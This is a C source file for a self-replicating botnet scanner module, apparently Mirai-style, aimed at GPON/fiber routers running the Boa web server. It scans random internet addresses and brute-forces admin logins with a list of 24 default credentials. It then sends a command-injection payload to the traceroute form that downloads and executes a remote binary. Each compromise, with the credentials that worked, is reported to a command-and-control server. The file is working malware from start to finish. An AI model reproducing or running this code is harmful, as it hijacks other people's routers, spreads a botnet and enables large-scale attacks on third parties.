#include "includes.h"
#include "fiber.h"
#include "util.h"
#include "rand.h"

#ifdef SELFREP

/* ============================================================================
 * FIBER/GPON SCANNER - Self-Replication Module
 * ============================================================================
 * Exploits command injection in GPON/ONT router web interface
 * Targets: Fiber routers with Boa web server (0.93.15)
 * Method: POST /boaform/admin/formTracert command injection
 * Credentials: 24 username/password combinations
 * Reports successful compromises to C&C via SCAN_CB_PORT
 * ============================================================================ */

#define FIBER_MAX_CONNS 64
#define FIBER_CONNECTION_TIMEOUT 10
#define FIBER_READ_TIMEOUT 10

/* Connection states */
#define FIBER_CLOSED 0
#define FIBER_CONNECTING 1
#define FIBER_CHECKING_BOA 2
#define FIBER_SENDING_LOGIN 3
#define FIBER_WAITING_LOGIN_RESP 4
#define FIBER_SENDING_EXPLOIT 5
#define FIBER_COMPLETE 6

/* Credential structure */
struct fiber_credential {
    char *username;
    char *password;
};

/* Connection structure */
struct fiber_connection {
    int fd;
    uint8_t state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    time_t last_recv;
    time_t connect_time;
    int cred_index;
    BOOL logged_in;
    char username[32];
    char password[32];
};

/* Fiber credentials - matches Go version */
static struct fiber_credential credentials[] = {
    {"adminisp", "adminisp"},
    {"admin", "admin"},
    {"admin", "1234567890"},
    {"admin", "123456789"},
    {"admin", "12345678"},
    {"admin", "1234567"},
    {"admin", "123456"},
    {"admin", "12345"},
    {"admin", "1234"},
    {"admin", "user"},
    {"guest", "guest"},
    {"support", "support"},
    {"user", "user"},
    {"admin", "password"},
    {"default", "default"},
    {"admin", "password123"},
    {"admin", "cat1029"},
    {"admin", "pass"},
    {"admin", "dvr2580222"},
    {"admin", "aquario"},
    {"admin", "1111111"},
    {"administrator", "1234"},
    {"root", "root"},
    {"admin", "admin123"},
    {NULL, NULL}
};

static struct fiber_connection conns[FIBER_MAX_CONNS];
static void fiber_connect(struct fiber_connection *);
static void fiber_close(struct fiber_connection *);
static void fiber_handle_recv(struct fiber_connection *);
static ipv4_t get_random_ip(void);
static BOOL is_rfc1918(ipv4_t);
static void send_exploit(struct fiber_connection *);
static void report_success(struct fiber_connection *);

void fiber_scanner_init(void) {
    int i;

    if (fork() == 0) {
        /* Initialize connections */
        for (i = 0; i < FIBER_MAX_CONNS; i++) {
            conns[i].fd = -1;
            conns[i].state = FIBER_CLOSED;
            conns[i].cred_index = 0;
            conns[i].logged_in = FALSE;
        }

        srand(time(NULL));

        while (TRUE) {
            fd_set fdset;
            struct timeval tv;
            int maxfd = 0;
            time_t now = time(NULL);

            FD_ZERO(&fdset);

            /* Add all active connections to fdset */
            for (i = 0; i < FIBER_MAX_CONNS; i++) {
                if (conns[i].state != FIBER_CLOSED) {
                    FD_SET(conns[i].fd, &fdset);
                    if (conns[i].fd > maxfd) maxfd = conns[i].fd;
                }
            }

            tv.tv_sec = 1;
            tv.tv_usec = 0;

            int nfds = select(maxfd + 1, &fdset, NULL, NULL, &tv);

            /* Check for timeouts */
            for (i = 0; i < FIBER_MAX_CONNS; i++) {
                if (conns[i].state != FIBER_CLOSED && 
                    (now - conns[i].last_recv > 30 || 
                     now - conns[i].connect_time > 60)) {
                    fiber_close(&conns[i]);
                }
            }

            /* Process readable sockets */
            if (nfds > 0) {
                for (i = 0; i < FIBER_MAX_CONNS; i++) {
                    if (conns[i].state != FIBER_CLOSED && 
                        FD_ISSET(conns[i].fd, &fdset)) {
                        fiber_handle_recv(&conns[i]);
                    }
                }
            }

            /* Start new connections */
            for (i = 0; i < FIBER_MAX_CONNS; i++) {
                if (conns[i].state == FIBER_CLOSED) {
                    conns[i].dst_addr = get_random_ip();
                    conns[i].dst_port = 80;
                    fiber_connect(&conns[i]);
                    break;
                }
            }

            sleep(1);
        }
    }
}

static void fiber_connect(struct fiber_connection *conn) {
    struct sockaddr_in addr;

    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->fd == -1) return;

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = htons(conn->dst_port);

    connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr));

    conn->state = FIBER_CONNECTING;
    conn->connect_time = time(NULL);
    conn->last_recv = time(NULL);
    conn->cred_index = 0;
    conn->logged_in = FALSE;
}

static void fiber_close(struct fiber_connection *conn) {
    if (conn->fd != -1) {
        close(conn->fd);
        conn->fd = -1;
    }
    conn->state = FIBER_CLOSED;
}

static void fiber_handle_recv(struct fiber_connection *conn) {
    char buf[4096];
    int n;

    n = recv(conn->fd, buf, sizeof(buf), 0);
    if (n <= 0) {
        if (conn->state == FIBER_SENDING_EXPLOIT || conn->state == FIBER_COMPLETE) {
            /* Exploit already sent, close normally */
            if (conn->logged_in) {
                report_success(conn);
            }
        }
        fiber_close(conn);
        return;
    }

    conn->last_recv = time(NULL);

    switch (conn->state) {
        case FIBER_CONNECTING: {
            /* Check connection established */
            int err = 0;
            socklen_t err_len = sizeof(err);
            getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
            
            if (err != 0) {
                fiber_close(conn);
                return;
            }

            /* Send Boa server check */
            char check_payload[512];
            int check_len = util_sprintf(check_payload,
                "POST /boaform/admin/formLogin HTTP/1.1\r\n"
                "Host: %d.%d.%d.%d\r\n"
                "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 29\r\n"
                "Connection: keep-alive\r\n"
                "Referer: http://%d.%d.%d.%d/admin/login.asp\r\n"
                "\r\n"
                "username=admin&psd=Feefifofum\r\n\r\n",
                (conn->dst_addr >> 24) & 0xFF,
                (conn->dst_addr >> 16) & 0xFF,
                (conn->dst_addr >> 8) & 0xFF,
                conn->dst_addr & 0xFF,
                (conn->dst_addr >> 24) & 0xFF,
                (conn->dst_addr >> 16) & 0xFF,
                (conn->dst_addr >> 8) & 0xFF,
                conn->dst_addr & 0xFF);

            send(conn->fd, check_payload, check_len, 0);
            conn->state = FIBER_CHECKING_BOA;
            break;
        }

        case FIBER_CHECKING_BOA: {
            /* Check for Boa/0.93.15 server */
            if (util_stristr(buf, n, "Server: Boa/0.93.15") ||
                util_stristr(buf, n, "HTTP/1.0 302") ||
                util_stristr(buf, n, "HTTP/1.1 302")) {
                
                /* Vulnerable device found, try login */
                conn->cred_index = 0;
                
                /* Send first login attempt */
                if (credentials[conn->cred_index].username != NULL) {
                    char login_payload[1024];
                    int login_len = util_sprintf(login_payload,
                        "POST /boaform/admin/formLogin HTTP/1.1\r\n"
                        "Host: %d.%d.%d.%d\r\n"
                        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: %d\r\n"
                        "Connection: keep-alive\r\n"
                        "Referer: http://%d.%d.%d.%d/admin/login.asp\r\n"
                        "\r\n"
                        "username=%s&psd=%s\r\n\r\n",
                        (conn->dst_addr >> 24) & 0xFF,
                        (conn->dst_addr >> 16) & 0xFF,
                        (conn->dst_addr >> 8) & 0xFF,
                        conn->dst_addr & 0xFF,
                        14 + util_strlen(credentials[conn->cred_index].username) + 
                            util_strlen(credentials[conn->cred_index].password),
                        (conn->dst_addr >> 24) & 0xFF,
                        (conn->dst_addr >> 16) & 0xFF,
                        (conn->dst_addr >> 8) & 0xFF,
                        conn->dst_addr & 0xFF,
                        credentials[conn->cred_index].username,
                        credentials[conn->cred_index].password);

                    send(conn->fd, login_payload, login_len, 0);
                    conn->state = FIBER_SENDING_LOGIN;
                } else {
                    /* No credentials, send exploit anyway */
                    send_exploit(conn);
                }
            } else {
                /* Not vulnerable, close */
                fiber_close(conn);
            }
            break;
        }

        case FIBER_SENDING_LOGIN:
        case FIBER_WAITING_LOGIN_RESP: {
            /* Check for successful login (302 redirect) */
            if (util_stristr(buf, n, "HTTP/1.0 302") ||
                util_stristr(buf, n, "HTTP/1.1 302")) {
                
                /* Login successful */
                conn->logged_in = TRUE;
                util_strncpy(conn->username, credentials[conn->cred_index].username, 32);
                util_strncpy(conn->password, credentials[conn->cred_index].password, 32);
                
                /* Send exploit */
                send_exploit(conn);
            } else if (util_stristr(buf, n, "error") ||
                       util_stristr(buf, n, "failed") ||
                       util_stristr(buf, n, "invalid")) {
                
                /* Login failed, try next credential */
                conn->cred_index++;
                
                if (credentials[conn->cred_index].username != NULL) {
                    /* Try next credential */
                    char login_payload[1024];
                    int login_len = util_sprintf(login_payload,
                        "POST /boaform/admin/formLogin HTTP/1.1\r\n"
                        "Host: %d.%d.%d.%d\r\n"
                        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: %d\r\n"
                        "Connection: keep-alive\r\n"
                        "Referer: http://%d.%d.%d.%d/admin/login.asp\r\n"
                        "\r\n"
                        "username=%s&psd=%s\r\n\r\n",
                        (conn->dst_addr >> 24) & 0xFF,
                        (conn->dst_addr >> 16) & 0xFF,
                        (conn->dst_addr >> 8) & 0xFF,
                        conn->dst_addr & 0xFF,
                        14 + util_strlen(credentials[conn->cred_index].username) + 
                            util_strlen(credentials[conn->cred_index].password),
                        (conn->dst_addr >> 24) & 0xFF,
                        (conn->dst_addr >> 16) & 0xFF,
                        (conn->dst_addr >> 8) & 0xFF,
                        conn->dst_addr & 0xFF,
                        credentials[conn->cred_index].username,
                        credentials[conn->cred_index].password);

                    send(conn->fd, login_payload, login_len, 0);
                } else {
                    /* No more credentials, send exploit anyway */
                    send_exploit(conn);
                }
            } else {
                /* Still waiting for response */
                conn->state = FIBER_WAITING_LOGIN_RESP;
            }
            break;
        }

        case FIBER_SENDING_EXPLOIT: {
            /* Exploit sent, wait for response then report */
            conn->state = FIBER_COMPLETE;
            if (conn->logged_in) {
                report_success(conn);
            }
            fiber_close(conn);
            break;
        }

        default:
            fiber_close(conn);
            break;
    }
}

static void send_exploit(struct fiber_connection *conn) {
    char exploit_payload[1024];
    int exploit_len = util_sprintf(exploit_payload,
        "POST /boaform/admin/formTracert HTTP/1.1\r\n"
        "Host: %d.%d.%d.%d\r\n"
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 201\r\n"
        "Connection: close\r\n"
        "Referer: http://%d.%d.%d.%d/diag_tracert_admin_en.asp\r\n"
        "\r\n"
        "target_addr=;rm -rf /var/tmp/wlancont;wget http://%s/bins/axis.mips -O >/var/tmp/wlancont;chmod 777 /var/tmp/wlancont;/var/tmp/wlancont fiber&waninf=1_INTERNET_R_VID_\r\n\r\n",
        (conn->dst_addr >> 24) & 0xFF,
        (conn->dst_addr >> 16) & 0xFF,
        (conn->dst_addr >> 8) & 0xFF,
        conn->dst_addr & 0xFF,
        (conn->dst_addr >> 24) & 0xFF,
        (conn->dst_addr >> 16) & 0xFF,
        (conn->dst_addr >> 8) & 0xFF,
        conn->dst_addr & 0xFF,
        HTTP_SERVER);

    send(conn->fd, exploit_payload, exploit_len, 0);
    conn->state = FIBER_SENDING_EXPLOIT;
}

static void report_success(struct fiber_connection *conn) {
    /* Report successful compromise to C&C */
    uint8_t report[128];
    uint32_t addr = conn->dst_addr;
    uint16_t port = htons(conn->dst_port);
    int user_len = util_strlen(conn->username);
    int pass_len = util_strlen(conn->password);

    report[0] = (addr >> 24) & 0xFF;
    report[1] = (addr >> 16) & 0xFF;
    report[2] = (addr >> 8) & 0xFF;
    report[3] = addr & 0xFF;
    report[4] = (port >> 8) & 0xFF;
    report[5] = port & 0xFF;
    report[6] = (uint8_t)user_len;
    memcpy(report + 7, conn->username, user_len);
    report[7 + user_len] = (uint8_t)pass_len;
    memcpy(report + 8 + user_len, conn->password, pass_len);

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd == -1) return;

    struct sockaddr_in cnc;
    cnc.sin_family = AF_INET;
    cnc.sin_addr.s_addr = inet_addr(CNC_ADDR);
    cnc.sin_port = htons(SCAN_CB_PORT);

    if (connect(fd, (struct sockaddr *)&cnc, sizeof(cnc)) == 0) {
        send(fd, report, 8 + user_len + pass_len, 0);
    }
    close(fd);
}

static ipv4_t get_random_ip(void) {
    ipv4_t addr;

    while (TRUE) {
        addr = rand_next();

        /* Target fiber/GPON router deployments
         * Focus: ISP fiber networks worldwide
         * Regions: Asia, Latin America, Europe, Middle East
         */
        uint8_t first_octet = (addr >> 24) & 0xFF;

        /* Asia - Major fiber deployments */
        if (first_octet >= 101 && first_octet <= 125) break;
        if (first_octet >= 180 && first_octet <= 223) break;

        /* Latin America */
        if (first_octet >= 177 && first_octet <= 201) break;

        /* Europe */
        if (first_octet >= 46 && first_octet <= 95) break;

        /* Middle East */
        if (first_octet >= 80 && first_octet <= 95) break;

        /* Africa */
        if (first_octet >= 102 && first_octet <= 197) break;
    }

    return addr;
}

static BOOL is_rfc1918(ipv4_t addr) {
    uint8_t *octets = (uint8_t *)&addr;

    if (octets[0] == 10) return TRUE;
    if (octets[0] == 172 && octets[1] >= 16 && octets[1] <= 31) return TRUE;
    if (octets[0] == 192 && octets[1] == 168) return TRUE;

    return FALSE;
}

#endif
